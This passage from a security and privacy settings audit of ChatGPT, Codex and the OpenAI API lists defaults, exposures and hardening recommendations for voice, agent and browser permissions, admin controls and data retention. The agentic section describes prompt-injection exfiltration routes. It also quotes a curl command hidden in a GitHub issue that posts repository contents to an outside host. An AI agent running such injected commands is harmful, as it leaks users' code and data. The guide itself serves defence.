> **Ads are live.** Testing started in the **United States on 2026-02-09**. Ads appear only on **Free and Go**; *"Plus, Pro, Business, Enterprise, and Edu accounts will not have ads,"* none for under-18 accounts, and *"Personalized ads are not initially available in the European Economic Area (EEA) or Switzerland."* Controls at Settings → **Ads controls**: **Personalize ads** and **Past chats and memory** — **both `unresolved` for default.** With personalization on, ad selection uses *"Your current chat thread … How you interact with ads … Past chats and memory."* OpenAI states advertisers *"never receive your chats, chat history, memories, name, email, precise location, IP address, or sensitive information."* Ads data retained **up to 30 days**; **Delete ads data** clears history and topics. Temporary Chats show no ads. `verified`

## 6. Voice, audio & camera

> **The headline:** transcripts yes, raw audio no. Verbatim: *"If Improve the model for everyone is turned on, we may use transcripts and other files from your Voice conversations to train our models … We do not use the associated audio or video clips for training unless you choose to share them."*

- **Setting:** Voice mode — Live / Advanced / Standard
- **Where:** Settings → Voice. `https://chatgpt.com/settings/voice`
- **Default:** `unresolved` — availability *"may depend on your plan, workspace settings, region, app version, and parental controls."*
- **Exposes:** **Retention differs materially by mode.** Live and Advanced: audio clips (and Advanced video clips) are *"stored with the transcript that appears in your chat history. Clips are retained for 30 days."* Standard: *"audio is transcribed before ChatGPT generates a response. We delete the audio after transcription is complete … Audio is deleted even if transcription fails."*
- **Recommend:** **Standard** for minimum audio retention — the only mode where OpenAI states the audio is deleted. Tradeoff: Standard is turn-by-turn, and **video/screen sharing works only in Advanced.**
- **Risk:** Medium
- **Confidence:** `verified` (retention per mode); `unresolved` (default mode)

- **Setting:** Voice transcripts in chat history *(behavior, no toggle)*
- **Default:** **Always on.** *"A transcript is added to the chat after a Voice conversation."* Audio/video clips sit alongside it for 30 days.
- **Recommend:** **Delete, don't archive** — *"Archiving only removes the chat from your sidebar; it does not delete the chat or its associated audio or video clips."*
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Live video / Share Screen *(in voice)*
- **Where:** iOS/Android only, during a Voice conversation in **Advanced** mode
- **Default:** Off until invoked; requires OS camera / screen-recording consent.
- **Exposes:** Camera frames or your entire phone screen stream to OpenAI; the resulting video clips sit with the transcript for 30 days.
- **Recommend:** **Never share screen on a device with work accounts, banking apps, or notifications visible.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** `Enable Dictation` / `Recent recordings`
- **Where:** Settings → Voice → Dictation. Adjacent row: **Recent recordings** — *"Your last 20 recordings are saved on this device."*
- **Default:** `unresolved` for the toggle.
- **Exposes:** *"Audio from dictation will be retained for as long as the chat is part of your chat history."* Twenty recent clips also sit on the local device.
- **Recommend:** ⚠️ **Documented contradiction:** the iOS App FAQ still claims *"Do you store audio clips from the speech-to-text feature? **No**"* — **that page is stale.** Treat the Voice Dictation FAQ as current.
- **Risk:** Medium
- **Confidence:** `verified` (both pages read; the conflict is real)

- **Setting:** `Background conversations` / `Start with Voice` / `Start automatically in CarPlay`
- **Default:** `unresolved` for all three.
- **Exposes:** **Background conversations** keeps the mic-active voice session running *"while using other apps or while your phone is locked."* **Start with Voice** opens the mic automatically on a new conversation. **Start automatically in CarPlay** opens the mic on vehicle connect.
- **Recommend:** **All three off.** These are the accidental-mic-activation settings, and the CarPlay one fires with passengers present.
- **Risk:** Medium
- **Confidence:** `verified` (labels, behavior); `unresolved` (defaults)

- **Setting:** `ChatGPT Voice` *(master enable)*
- **Where:** Settings → Personalization → Additional ChatGPT settings
- **Recommend:** Off if you never use voice — **the cleanest way to eliminate the whole audio surface in one move.**
- **Risk:** Low
- **Confidence:** `verified` (exists, exact label); `unresolved` (default)

- **Setting:** ChatGPT Record *(record mode)*
- **Where:** macOS desktop app → **Record**. Requires System Settings → Privacy & Security → **Microphone** *and* **Screen & System Audio Recording** → ChatGPT. Admin: Settings → Workspace Controls → Record.
- **Default:** Plus, Pro, Business, Enterprise, Edu — **macOS only**. **"Record mode will be disabled by default for all Enterprise and Edu workspaces, and must be enabled by a workspace owner."** Plus/Pro/Business default: `unresolved`.
- **Exposes:** Captures mic **and system audio** — i.e. everyone else on the call — then transcribes and saves transcript + canvas into chat history. Audio files auto-delete after transcription and are **not** trained on; **transcripts and canvases are trainable** if *Improve the model for everyone* is on. 4-hour cap.
- **Recommend:** Treat as a consent-bearing surface. OpenAI disclaims responsibility outright: *"You're responsible for making sure that your use of record mode follows applicable laws."* **Revoke Screen & System Audio Recording when not in use — one macOS grant covers both screenshots and system-audio capture.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** 1-800-CHATGPT (phone) and WhatsApp
- **Default:** No account required, **no opt-out, no in-app toggle.** 30 free minutes/month (US/CA).
- **Exposes:** *"We do store and may review your calls and transcripts of calls with 1-800-ChatGPT for a limited period of time for safety and abuse prevention purposes."* Conversations are keyed to **your phone number**, and **"We do not currently allow users to unlink phone numbers from OpenAI accounts."**
- **Recommend:** **Don't use it for anything sensitive.** No data-control toggle, no history UI, no unlink path.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Sora cameos / likeness consent
- **Default:** **Gone.** Sora discontinued; a help-center search for "cameo" returns **zero** articles. *"we will permanently delete any data associated with your use of Sora."*
- **Recommend:** **The likeness capability did not disappear; it moved** to Settings → Personalization → **Reference photos** (§2), with weaker controls: add/delete only, no consent model, no documented training exclusion. **That is the substantive regression here.**
- **Risk:** Low *(residual)*
- **Confidence:** `verified`

> **"Reference audio" / voice-print enrollment does not exist.** Checked Settings → Voice and → Personalization in the live app plus the Voice, Memory and Dictation articles. The analogues are *Reference photos*, *Reference record history*, and *Reference chat history*. `verified` absent on web; `unresolved` for mobile-only surfaces.

## 7. Agentic / computer-use permissions

> Live surface: **cloud browser**, **built-in browser (desktop app)**, **browser extension**, **Computer Use**, **Codex (local + Cloud)**, **deep research**, **Lockdown Mode**. Agent mode, Operator and Atlas are retired.

- **Setting:** `Lockdown Mode`
- **Where:** Settings → Security → Advanced security → Lockdown Mode. Per-chat override via the **LOCKDOWN MODE** label in the composer. Managed workspaces: delivered as a custom role.
- **Default:** Off. Available to *"eligible personal accounts, self-serve ChatGPT Business accounts, and supported managed workspaces."*
- **Exposes:** At default (off), ChatGPT does live web browsing, deep research, web image retrieval, file downloads for analysis, and connector write actions — **the outbound paths a prompt injection uses to exfiltrate data.**
- **Recommend:** **On.** The designed answer to prompt-injection exfiltration; it blocks the final hop. What it disables: live browsing (cached only), image retrieval, **deep research**, agent mode, Canvas networking, file downloads for data analysis. What it does **not** change: memory, file uploads, sharing, or training — and it **does not affect Codex network access.** **It is the only mechanism that overrides additive RBAC grants.** Mutually exclusive with Developer Mode.
- **Risk:** High *(leaving it off is the default exfiltration exposure)*
- **Confidence:** `verified` (behavior and availability; the literal word "default" never appears, so the off state is inferred from the "Turn on" instructions)

- **Setting:** `ChatGPT Work website approvals` *(cloud browser)* — Always ask / Auto approve / Always allow
- **Where:** Settings → Cloud computer. Verified live at `https://chatgpt.com/settings/cloud-computer`, where the value read **"Always ask."**
- **Default:** **Always ask.** Verbatim: *"By default, ChatGPT will ask for your permission before accessing a new website in the cloud browser."* **ChatGPT Work on paid plans, excluding Free and Go.**
- **Recommend:** Keep **Always ask**. OpenAI's own doc labels **Always allow** *"This is not recommended."*
- **Risk:** High if set to Always allow; Low at default
- **Confidence:** `verified` (docs + live pane)

- **Setting:** `ChatGPT Work cookies` *(cloud browser session persistence)*
- **Where:** Settings → Cloud computer → Manage cookies used by ChatGPT Work
- **Default:** **Sessions persist.** Verbatim: *"The authentication will persist for future tasks until it expires, so you do not need to sign in each time."*
- **Exposes:** A signed-in session inside OpenAI's remote browser stays live across tasks — **so a later task, or a later prompt injection, can act as you on that site without re-authenticating.**
- **Recommend:** Clear per-site data after any sensitive session. **The sharpest edge in the cloud-browser design: the credential handling is good, the session persistence is the exposure.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Secure sign-in form + confirmation before consequential actions *(cloud browser)*
- **Default:** Always on, **not configurable.** *"Credentials entered through the secure form go directly to the remote browser. The username and password entered there are not visible to the model, and ChatGPT does not store those sign-in credentials."* Separately: *"Website access permission is separate from approval for consequential actions."*
- **Recommend:** Use only the secure form — never paste credentials, 2FA codes or card numbers into chat. The cloud browser is isolated from your device: *"It does not use your personal browser's open tabs, browsing history, saved passwords, cookies, extensions, or existing sign-ins."* Prefer **takeover** for anything sensitive.
- **Risk:** Low
- **Confidence:** `verified`

- **Setting:** Allowed and blocked websites *(built-in browser, desktop app)*
- **Where:** Desktop app → Settings → Browser. **⌘+Shift+B** / **Ctrl+Shift+B**.
- **Default:** Asks per new site. *"ChatGPT asks before it uses a website unless you have already allowed that site."*
- **Exposes:** Page content, rendered state and screenshots of allowed sites flow into chat. OpenAI's own framing: *"Treat website content as untrusted."* **Admin-lockable.**
- **Recommend:** Approve hosts one at a time. **The safer of the two local browser paths — it uses its own browser state, not your Chrome profile.**
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** `Enable full CDP access` *(built-in browser Developer mode)*
- **Default:** **Off.** Admin lock: `browser_use_full_cdp_access = false`.
- **Exposes:** Chrome DevTools Protocol against live pages — console, network traffic, DOM, styles. *"Full CDP access can expose sensitive browser internals."*
- **Recommend:** Leave off except for an active debugging session on a site you own.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Browser extension website access — Allow once / Allow for this site / Allow for all sites / Decline
- **Where:** In-task prompt. Manage at Settings → Computer Use → Manage (shared allowlist across Chrome, Edge, Brave, Opera, Vivaldi).
- **Default:** Asks per new website.
- **Exposes:** ⚠️ **The riskiest surface at default, because it drives your real signed-in profile.** *"sites may treat approved clicks, form submissions, and signed-in actions as coming from your account."* The browser install prompt itself may grant *"Read and change all your data on all websites"* and *"Read and change your browsing history on all your signed-in devices"* — **ChatGPT's allowlists sit on top of those, not instead of them.**
- **Recommend:** **Allow once** only — "Allow for all sites" carries OpenAI's **Elevated Risk** badge. **Install the extension into a dedicated browser profile not signed into sensitive accounts**, and prefer the built-in or cloud browser when the task does not need your real session.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Browser history access *(extension)*
- **Default:** Asks; access scoped to the single request. **No always-allow option exists.** Carries the **Elevated Risk** badge. Admin lock: `allow_history_access = false`.
- **Exposes:** *"Browser history can include sensitive telemetry, internal URLs, search terms, and activity from browser sessions on signed-in devices."*
- **Recommend:** Decline by default.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Computer Use — Always-allowed apps, and OS Screen Recording / Accessibility grants
- **Where:** Desktop app → Plugins → Computer Use. App access at Settings → Computer Use. OS grants: System Settings → Privacy & Security → Screen Recording / Accessibility → Codex Computer Use.
- **Default:** Not installed. Always-allowed list **empty** — ChatGPT asks before using each app. Admin lock: `computer_use = false`.
- **Exposes:** ChatGPT sees your screen and clicks/types in approved apps, **including clipboard state**; on Windows it takes over the foreground pointer and keyboard. Hard limits: it *"can't automate terminal apps or ChatGPT itself"* and *"can't authenticate as an administrator or approve security and privacy permission prompts."*
- **Recommend:** **Keep the always-allowed list empty, or trivial only** — OpenAI's own screenshot shows Calculator as the sole entry. Never add a mail client, password manager, bank app, or browser. **Revoke the OS grants in System Settings when done; ChatGPT's in-app settings cannot revoke an OS grant.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** `Locked use` *(macOS)*
- **Default:** **Off** — *"only after you enable it."*
- **Exposes:** Installs an **Apple authorization plug-in** that joins the macOS unlock flow so ChatGPT can temporarily unlock your Mac mid-task. Safeguards: short-lived scoped authorization window, available only during an active Computer Use turn, all displays covered while unlocked, relocks on detected local input.
- **Recommend:** **Leave off. The most consequential consumer-facing toggle in the entire product — it hands an agent a conditional unlock path to your machine.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Site tools (WebMCP)
- **Default:** Used automatically when a site offers a matching tool, subject to the website-access prompt.
- **Exposes:** OpenAI states it plainly: *"Site tools may expose functionality not otherwise present on the webpage, which carries with it novel risks including data exfiltration and prompt injection."*
- **Recommend:** Trusted sites only. Documented guarantee worth knowing: *"Instructions from a website or site tool cannot authorize ChatGPT to share information or take sensitive actions on your behalf."*
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Codex permission modes — Ask for approval / Approve for me / Full access
- **Where:** Permissions control below the composer, or `/permissions` in the CLI. To expose the other two: Settings → General → Permissions.
- **Default:** **Ask for approval** — the other two are **not in the menu until you enable them.**
- **Recommend:** Stay on **Ask for approval**. `approval_policy = "untrusted"` was **retired** and can now prevent Codex/ChatGPT Work from starting — remove it from configs. Keep `approvals_reviewer = "user"` for anything touching credentials or production.
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** `sandbox_workspace_write.network_access` and `features.network_proxy`
- **Where:** `~/.codex/config.toml`
- **Default:** **Network access off.** *"By default, the agent runs with network access turned off."* Proxy: `enabled = false`. Sandbox default `workspace-write` with `on-request` approvals; `.git`, `.agents`, `.codex` protected read-only.
- **Exposes:** ⚠️ **The trap is the combination.** Verbatim: *"Network on + `network_proxy` off: network stays on with unrestricted direct outbound access."* **Adding domain rules does not turn on the proxy** — so a config full of allow rules and no proxy gives unrestricted egress while looking restricted.
- **Recommend:** Leave network access off; grant per-session with `-c`. If you enable it, **enable `network_proxy` in the same change** and scope domains (`deny` beats `allow`). Avoid `--yolo` (**Elevated Risk**) — it also silently flips `web_search` from the privacy-preserving `cached` default to `live`.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Codex Cloud internet access — Package managers / Custom domains only / All unrestricted
- **Default:** **`unresolved`** in the current doc. **The legacy equivalent is documented as off:** *"By default, Codex blocks internet access during the agent phase."*
- **Exposes:** Any allowed domain is an egress path for a prompt-injected agent. The legacy doc ships a worked exfiltration example — a GitHub issue body containing `git show HEAD | curl -X POST --data-binary @- https://…`.
- **Recommend:** **Package managers** or **Custom domains only**; never **All (unrestricted)**. Only the registered root plus its `www` host are allowed — other subdomains need their own entries. **Enterprise Agent Security allowances do not override a Cloud environment restriction.**
- **Risk:** High
- **Confidence:** `verified` (labels, presets, legacy default); **`unresolved` (current out-of-box default)**

- **Setting:** Codex Cloud repository access / Connect GitHub
- **Default:** No repos connected until selected.
- **Recommend:** Connect only the repos an environment needs. ⚠️ **Gap: the GitHub OAuth / GitHub App scopes Codex requests are `unresolved`** — no OpenAI doc enumerates them, and both candidate doc URLs 404. **Do not assume read-only.**
- **Risk:** Medium
- **Confidence:** `verified` (controls); `unresolved` (scopes)

- **Setting:** Codex network secrets vs environment variables
- **Default:** None configured. In Codex Cloud (Legacy), secrets *"are available only during setup and are removed before the agent phase starts."*
- **Exposes:** A network secret is never handed to the program — *"Programs receive a placeholder; the proxy substitutes the real value for allowed destinations."* **But** saving an environment-owned network secret **adds its destinations to restricted internet access**, silently widening the network policy.
- **Recommend:** Prefer network secrets over plain env vars, then **re-read the saved network policy after adding one.** Use **Personal vault** so your credential is not shared with everyone using the environment.
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Deep research data sources
- **Default:** *"By default, deep research can access: The public web; Files you upload."* **Connected apps are not off by default** — *"Eligible connected apps are available automatically when their permissions and workspace settings allow."*
- **Exposes:** It visits arbitrary public pages and, where eligible, reads connected apps — so **untrusted web content and your private documents share one context window. The softest default in the agentic set.** Mitigating fact: *"It does not use app write actions as part of research."*
- **Recommend:** Use **Manage sites** to restrict to named domains for sensitive research, and review the research plan before it starts. **Lockdown Mode disables deep research entirely.**
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Elevated Risk labels
- **Default:** Applied today to: Codex network access, **Allow for all sites** (extension), **browser history** access, and `--yolo`.
- **Exposes:** OpenAI's own words: labeled features *"are offered on an optional and early access basis, **outside of the standard representations and warranties** we make for our generally available services."*
- **Recommend:** **Treat the badge as a contractual carve-out, not a style choice.** Note it is temporary: *"we may remove the 'Elevated risk' label once we determine the risks are reasonably mitigated"* — today's badged settings may shed the badge without the capability changing.
- **Risk:** High
- **Confidence:** `verified`

> **Prompt-injection posture at default, honestly:** the network and filesystem defaults are genuinely conservative (Codex network off, `web_search = cached`, cloud browser asks per site, extension asks per site, Computer Use asks per app, Computer History off, Locked use off, full CDP off). **The soft spots are:** deep research mixing connected apps with untrusted web content automatically; **Business workspaces** where apps and plugins are enabled by default; **persistent cloud-browser sessions**; the **browser extension's** browser-level permissions; and the `network_access=true` + `network_proxy=false` combination. **Lockdown Mode is the designed answer and it is off by default.** Third-party security journalism on this is `unresolved` — the research pass exhausted its search budget before an independent sweep could run, so **no named researchers, attacks, or vendor claims are reported here.**

## 8. Admin / workspace plane (Business, Enterprise, Edu)

> **Documented deep links** (all returned 403 to unauthenticated curl — none 404'd): Workspace General `chatgpt.com/admin` · Members `/admin/members` · Groups `/admin/groups` · **Permissions & roles `/admin/permissions`** · GPTs `/admin/gpts` · Apps `/admin/ca` · Identity & access `/admin/identity` · Tenant **Admin Console `admin.openai.com`** · External access `admin.openai.com/external-access` · Codex policies `chatgpt.com/codex/cloud/settings/policies`. **These are migrating from `chatgpt.com/admin/*` to `admin.openai.com` — expect churn.**

- **Setting:** What an admin can access *(member-facing notice)*
- **Default:** Broad. Verbatim: your administrator *"may be able to access, export, audit, retain, delete, and **opt-in to share data tied to this account with OpenAI to improve OpenAI's models**"* — covering prompts, uploaded files, outputs, conversation history, shared workspace content, and usage metadata.
- **Exposes:** **The "Business/Enterprise never trains on your data" guarantee has an admin-controlled exception.** Also: *"The OpenAI Terms of Use and Privacy Policy do not apply to your use of ChatGPT while you are signed in to your administrator-managed account."*
- **Recommend:** Members: use a personal account for non-work activity. Consultants: **confirm with the client admin whether this opt-in has been exercised.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** `Use improved memory` *(workspace role permission)*
- **Default:** **Effectively ON for standard Enterprise/Edu** after the 2026-06-25 early-access window. **Disabled by default in ChatGPT for Healthcare and Enterprise with Regulated Workspace.**
- **Recommend:** Off unless you have an explicit use case. **The highest-leverage memory toggle, and it silently turned itself on for most Enterprise workspaces — audit it first.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Plugin / app workspace availability
- **Where:** Admin → Plugins, or Workspace settings → Apps
- **Default:** **Tier-split and verified.** Enterprise/Edu: *"In general, new plugins and apps are disabled by default."* **ChatGPT Business: "apps are enabled by default."**
- **Exposes:** **On Business, every newly shipped connector is live for all members on day one** — member chats and the third-party account exchange data with no admin review step.
- **Recommend:** On Business, treat the default-on state as a standing to-do: audit and disable everything not explicitly approved, and **re-audit monthly because new apps keep arriving enabled.** Use Admin → Plugins → Public → Export CSV as the audit input (data up to 48 hours old).
- **Risk:** High *(Business)* / Medium *(Enterprise/Edu)*
- **Confidence:** `verified`

- **Setting:** Actions — Read actions / Write actions, and New actions
- **Default:** **Write actions are disabled by default** until an admin enables them per app. Google Drive unified Docs/Sheets/Slides actions: **off by default for Enterprise and Edu, on by default for ChatGPT Business.** For custom MCP connectors, *"new actions are disabled by default until approved."* The **New actions** default is `unresolved`.
- **Exposes:** At **Enable all new actions**, a provider shipping a new capability silently gains it in your workspace with no review.
- **Recommend:** Read-only unless a named workflow needs writes. Set **Disable new actions** — but note the documented limit: it *"applies only to actions introduced later; it does not disable actions that were already enabled."*
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Administrator-managed Google Drive sync
- **Default:** Individually authorized sync is **retired** — new connections ended 2026-08-10, existing disabled 2026-08-14.
- **Exposes:** Builds a persistent OpenAI-side index of selected Drive content, **separate from live actions.** Verbatim: *"Restrictions on direct actions may not limit content retrieved from a synced index, and sync content-selection settings may not restrict separate live app actions."*
- **Recommend:** Scope sync to specific shared drives and folders, exclude sensitive file types, **then separately** lock down live actions. **Two independent doors; closing one does not close the other.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Import marketplace *(GitHub plugin marketplaces)*
- **Default:** Not configured until an admin imports. Automatic **daily** sync.
- **Exposes:** A GitHub repo becomes a daily-syncing source of plugins in your workspace — **an automatic inbound supply chain.**
- **Recommend:** Only import private repos you control.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** GPTs → Actions allowed domains
- **Default:** **Fail-closed and verified:** *"If no domains are added, GPT actions are not allowed."* **Allowing a parent domain also allows all its subdomains.**
- **Recommend:** Leave the list empty, or add exact approved hosts only. **Avoid parent domains — subdomain inheritance is wide.** Note the **GPTs → Apps** restriction *"does not apply to third-party GPTs."*
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** `Allow event-triggered scheduled tasks`
- **Default:** **"This setting is turned off by default in Enterprise, Edu, and ChatGPT for Healthcare workspaces."**
- **Exposes:** Lets webhooks — new Gmail messages, Slack channel messages, GitHub PR activity — **autonomously trigger ChatGPT work with the member's connected-app credentials, unattended.** Not BAA-covered in Healthcare.
- **Recommend:** **Leave off. This is autonomous processing of inbound attacker-controllable content — the prime prompt-injection vector.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Workspace Agents — write action approval
- **Default:** **Off by default at launch for ChatGPT Enterprise.** Once on: *"By default, write actions for apps and connectors are set to **Always ask** during an agent run."* Business release notes say *"workspace agents are on by default at launch"* for Business.
- **Exposes:** **Never ask** lets an agent send, edit, post or delete autonomously. Critically, **agents bypass your chat-level defaults:** *"Workspace Agents use per-agent controls set by the agent's builder."* And constraints limit what the agent *asks* a connector to do but **do not filter what the connector returns.**
- **Recommend:** Keep **Always ask** for anything that sends or deletes; restrict publishing to a named role; **use a service account, not a personal one, for agent-owned connections.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Automatic account creation
- **Default:** **Verified and asymmetric:** *"For Enterprise plans, automatic account creation is **on by default for the first eligible ChatGPT workspace created in a new tenant**. It is **off by default for an additional workspace** created in an existing tenant."*
- **Exposes:** Anyone signing in with a verified-domain email is auto-provisioned a **full billable seat** with the workspace's default tool access — no SSO required, no SCIM involvement.
- **Recommend:** **Turn it off** before onboarding if you manage access via SCIM. OpenAI says so directly.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** External access — Identity / Connectors / Ads
- **Default:** **"Both new permissions are off by default during the admin preview."** Identity-only sign-in is on by default where no explicit policy is set.
- **Recommend:** Keep Connectors and Ads off, and switch from allow-all to allow-selected so *"future apps will need individual approval."* Note a workspace owner or admin **does not automatically have permission** to change these tenant-level settings.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** IP allowlist
- **Default:** Off (opt-in). **Enterprise and Edu only.**
- **Exposes:** When on, *"only users from the IPs you specify will be allowed access... even if the user has valid credentials."* **"For Compliance API traffic, IP Allowlisting is always enforced and cannot be turned off."** Does **not** cover platform.openai.com.
- **Recommend:** Enable, scoped to corporate egress or VPN.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Workspace Blocking (`ChatGPT-Allowed-Workspace-Id` header)
- **Where:** Not in the admin UI — a custom HTTP header injected at your network edge or SASE. **ChatGPT Enterprise only.**
- **Default:** Not configured.
- **Exposes:** Without it, an employee on the corporate network can sign into a **personal** ChatGPT workspace — **where training defaults to ON and no retention policy applies.**
- **Recommend:** Deploy it, plus block `https://chatgpt.com/backend-anon/` to kill anonymous usage. **The only documented defense against shadow personal-account usage.** Requires adding your certs to the pin list via MDM, because the desktop and mobile apps do certificate pinning.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Compliance Platform access — Admin key with **Conversation messages** permission
- **Default:** No access until a key is created. **"Only a workspace owner can grant broad compliance access or the Conversation messages permission"** — an admin does not get it by holding the admin role. *"Custom roles do not grant Admin key access."* Enterprise and Edu only.
- **Exposes:** A key with **Conversation messages** can read members' conversation content out of the workspace into your SIEM, DLP or eDiscovery stack.
- **Recommend:** Issue the narrowest scope per integration; keep **Conversation messages** to a single audited key with a named owner. **Treat key issuance as a privacy event, not an IT task.**
- **Risk:** High
- **Confidence:** `verified`

### What an admin can actually LOCK

**There is no general "lock this setting" mechanism.** The model, verified:

- **Ordinary RBAC is additive — "Off" does not mean denied.** Verbatim: *"Permissions from ordinary roles combine additively. If any assigned role grants access, either explicitly or by inheriting an enabled workspace setting, the member retains access,"* and *"An **Off** setting denies access through that role only."* Access is denied only if **every** applicable role is Off. Members inherit roles directly *and* through groups, so **one over-broad group grant silently defeats a careful denial.**
- **The one true override is a Lockdown Mode role.** *"An ordinary role allows a network-enabled capability; a Lockdown Mode role restricts it. → The Lockdown Mode restriction applies."* **The only documented hard lock.**
- **De facto locks via unavailability:** where an admin turns a capability off, the member-side setting does not render. Effective, but gating rather than locking.
- **Admin-locked in practice:** Work with Apps; Allow code edits on macOS; Record; Reference record history; memory settings; Browser Use, website access, file transfers, history access, saved approvals; web search by role; Member profiles sharing level; agent mode; Sites and public publishing; event-triggered tasks; developer mode; workspace retention.
- **Who can change what:** only Workspace Owners can create, delete, assign and unassign custom roles. Changes take **up to 5 minutes.**

**Recommendation:** **audit *effective* access, not configured intent.** Additive RBAC is the most likely source of a false sense of lockdown. **Risk: High.**

### Tier differences

| Control | Business | Enterprise | Edu |
|---|---|---|---|
| Training on workspace data | Off by default | Off by default | Off by default |
| Apps / plugins | **Enabled by default** | Disabled by default | Disabled by default |
| Google Drive unified actions | **On by default** | Off by default | Off by default |
| Sites | **Enabled by default** | Off by default | Off by default |
| Sites public publishing | not stated | **Off by default** | not stated |
| Disable shared links workspace-wide | **Not available** | Available | Available |
| RBAC / custom roles | Not available | Yes | Yes |
| Developer mode delegation to non-admins | **No** | Yes, via RBAC | Yes, via RBAC |
| Update a published custom app | **No** — recreate & republish | Yes | Yes |
| Retention policy | **Indefinite only** | Indefinite or time-bound | Indefinite or time-bound |
| Compliance Platform / audit / eDiscovery | **Not available** | Yes | Yes |
| Member data export | **Not available** | Not self-service | **Admin-enablable** (off by default) |
| IP allowlist | not stated | Yes | Yes |
| Workspace Blocking (SASE header) | not stated | **Enterprise only** | not stated |
| EKM | not stated | Yes | Yes |
| Record mode | `unresolved` | **Off by default** | **Off by default** |
| Privacy Center | Rolling out | **Excluded** | **Excluded** |

⚠️ **One unresolved contradiction in OpenAI's own docs, flagged because it is material.** On whether a Business/Team admin can read member chats: `openai.com/enterprise-privacy/` says *"Workspace admins have control over workspaces and **can view, access, export, and delete end user conversations** in the workspace."* `help.openai.com/en/articles/8798634` says the opposite: *"they cannot automatically view other members' private chat history"* and *"**Does usage analytics let admins read all user chats?** No."* **`unresolved` — if a decision hinges on this, get it in writing from OpenAI.**

## 9. API / developer plane

- **Setting:** Default API training policy *(no toggle)*
- **Default:** **Not used for training.** *"As of March 1, 2023, data sent to the OpenAI API is not used to train or improve OpenAI models (unless you explicitly opt in to share data with us)."* All tiers.
- **Recommend:** Leave as-is; just never flip the three sharing toggles below.
- **Risk:** Low
- **Confidence:** `verified`

- **Setting:** `store` *(Responses API)*
- **Where:** API request body on `POST /v1/responses`. Results visible at `platform.openai.com/logs?api=responses`.
- **Default:** **`true` when omitted.** *"Defaults to true when omitted. If set to true, response data will be stored for at least 30 days."*
- **Exposes:** ⚠️ **The biggest default-on exposure on the platform.** Every Responses call without an explicit `store=false` persists the full prompt and completion for at least 30 days, retrievable by API and visible in your org's Logs page.
- **Recommend:** **Set `store=false` explicitly on every Responses call handling client or personal data.** Note the asymmetry: **Chat Completions does not store by default; Responses does** — teams migrating silently gain 30-day storage.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Abuse-monitoring log retention
- **Default:** *"By default, abuse monitoring logs are generated for all API feature usage and retained for up to 30 days."* **Exceptions:** `/v1/audio/transcriptions`, `/v1/audio/translations`, `/v1/moderations` = **None**; **`/v1/conversations`, `/v1/conversations/items`, `/v1/chatkit/threads` = "Until deleted" (indefinite).**
- **Recommend:** Get approved for ZDR or MAM for client workloads. **The conversations/chatkit rows are the real trap — indefinite, not 30 days, for abuse monitoring too.**
- **Risk:** Medium *(High on `/v1/conversations` or `/v1/chatkit/threads`)*
- **Confidence:** `verified`

- **Setting:** Data Retention — Zero Data Retention / Modified Abuse Monitoring
- **Where:** Settings → Organization → Data controls → Data Retention — **the tab appears only after approval.**
- **Default:** **Not available out of the box.** *"these controls are subject to prior approval by OpenAI and acceptance of additional requirements."* No self-serve path at any tier.
- **Recommend:** **Modified Abuse Monitoring is the better default for most consulting workloads** — it excludes customer content from abuse logs across *all* endpoints while keeping full platform capability. **ZDR silently breaks stateful features.**
- **Risk:** High
- **Confidence:** `verified` (documented); page render `unresolved`

- **Setting:** ZDR eligibility by endpoint — **what ZDR does *not* cover**
- **Default:** With ZDR on, `store` is **force-treated as `false`** on `/v1/responses` and `/v1/chat/completions`. But: *"the endpoints and capabilities listed as No for Zero Data Retention Eligible... may still store application state, even if Zero Data Retention is enabled."* **NOT eligible:** `/v1/conversations`(+items), `/v1/chatkit/threads`, `/v1/agents`, `/v1/assistants`, `/v1/threads`(+messages/runs/steps), `/v1/vector_stores`, `/v1/files`, `/v1/fine_tuning/jobs`, `/v1/evals`, `/v1/batches`.
- **Exposes:** Using Assistants, vector stores, Files, Batch or fine-tuning under ZDR gives **false confidence** — those still persist, "Until deleted."
- **Recommend:** If you enable ZDR, architect around the eligible list only. **Never tell a client "ZDR means nothing is retained" without naming these exclusions.**
- **Risk:** High *(the false-confidence failure mode)*
- **Confidence:** `verified`

- **Setting:** Carve-outs that override ZDR/MAM
- **Exposes:** **CSAM classifier scanning overrides every control:** *"If the classifier detects potential CSAM content, the image will be retained for manual review, even if Zero Data Retention, Modified Abuse Monitoring, or Private Retention with PSP is enabled."*
- **Recommend:** Know this exists before promising unconditional non-retention.
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Project-level data retention (`retention_type`)
- **Default:** `organization_default`. Enum includes `none`. Selecting **None** *"will disable these controls for that project."*
- **Exposes:** **A project set to `none` reverts to full 30-day abuse logging even if the org is ZDR** — the easiest way to silently de-protect a client workload.
- **Recommend:** Keep every project on `organization_default` or an explicit ZDR/MAM value, and **audit for any project set to `none`.** Use Terraform to prevent drift.
- **Risk:** High
- **Confidence:** `verified`

